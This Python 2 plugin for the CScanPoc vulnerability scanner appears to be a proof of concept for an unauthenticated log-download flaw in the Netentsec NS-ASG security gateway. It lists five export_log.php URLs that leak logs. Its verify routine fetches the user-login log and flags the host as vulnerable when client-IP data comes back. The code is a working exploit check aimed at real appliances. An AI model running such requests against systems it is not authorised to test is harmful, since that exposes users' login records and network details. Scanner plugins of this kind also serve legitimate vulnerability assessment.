# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urlparse


class Vuln(ABVuln):
    vuln_id = 'Netentsec_0012'  # 平台漏洞编号，留空
    name = '网康NS-ASG log File Download'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        网康 NS-ASG 应用安全网关多处日志下载：
        https://foobar/admin/export_log.php?type=syslog
        https://foobar/admin/export_log.php?type=userflow
        https://foobar/admin/export_log.php?type=userapp
        https://foobar/admin/export_log.php?type=userlogin
        https://foobar/admin/export_log.php?type=url
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '网康应用安全网关'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '49cd992c-1165-4fd8-94e5-6250eede9993'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            arg = self.target
            payload = arg + '/admin/export_log.php?type=userlogin'
            code, head, res, err, _ = hh.http(payload)
            #print res
            if (code == 200) and ('客户端IP'.decode('utf-8').encode('gb2312') in res):
                #security_hole('Arbitrarily file download: ' + payload)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
